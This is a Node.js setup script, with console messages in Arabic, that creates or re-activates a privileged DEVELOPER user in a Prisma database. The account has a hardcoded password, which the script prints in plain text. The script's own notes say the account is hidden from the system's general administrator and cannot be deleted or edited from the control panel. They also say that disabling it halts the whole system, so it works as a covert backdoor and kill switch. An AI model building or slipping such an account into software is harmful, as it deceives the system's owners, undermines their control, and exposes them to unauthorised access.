const { PrismaClient } = require('@prisma/client')
const bcrypt = require('bcryptjs')

const prisma = new PrismaClient()

async function createDeveloper() {
  try {
    console.log('🔍 التحقق من وجود حساب المطور...')
    
    // التحقق من وجود حساب مطور
    const existingDeveloper = await prisma.user.findFirst({
      where: {
        role: 'DEVELOPER'
      }
    })

    if (existingDeveloper) {
      console.log('✅ حساب المطور موجود بالفعل')
      console.log(`   البريد: ${existingDeveloper.email}`)
      console.log(`   الحالة: ${existingDeveloper.isActive ? 'مفعل ✓' : 'غير مفعل ✗'}`)
      
      // تحديث الحالة إلى مفعل
      await prisma.user.update({
        where: { id: existingDeveloper.id },
        data: { isActive: true }
      })
      console.log('✅ تم تفعيل حساب المطور')
      return
    }

    console.log('📝 إنشاء حساب المطور...')
    
    // إنشاء حساب المطور
    const hashedPassword = await bcrypt.hash('Dev@2025!Secure', 12)
    
    const developer = await prisma.user.create({
      data: {
        name: 'System Developer',
        email: 'developer@system.local',
        password: hashedPassword,
        role: 'DEVELOPER',
        isActive: true // مفعل افتراضياً
      }
    })

    console.log('\n✅ تم إنشاء حساب المطور بنجاح!')
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    console.log(`📧 البريد الإلكتروني: ${developer.email}`)
    console.log(`🔑 كلمة المرور: Dev@2025!Secure`)
    console.log(`✓  الحالة: مفعل`)
    console.log(`🔒 الدور: DEVELOPER (مخفي عن الجميع)`)
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    console.log('\n⚠️  ملاحظات مهمة:')
    console.log('   • هذا الحساب مخفي تماماً ولا يظهر للمدير العام')
    console.log('   • عند تعطيل هذا الحساب، سيتوقف النظام بالكامل')
    console.log('   • تأكد من تغيير كلمة المرور بعد أول تسجيل دخول')
    console.log('   • لا يمكن حذف أو تعديل هذا الحساب من لوحة التحكم')
    
  } catch (error) {
    console.error('❌ خطأ في إنشاء حساب المطور:', error)
    if (error.code === 'P2002') {
      console.error('   السبب: البريد الإلكتروني مستخدم بالفعل')
    }
  } finally {
    await prisma.$disconnect()
  }
}

createDeveloper()
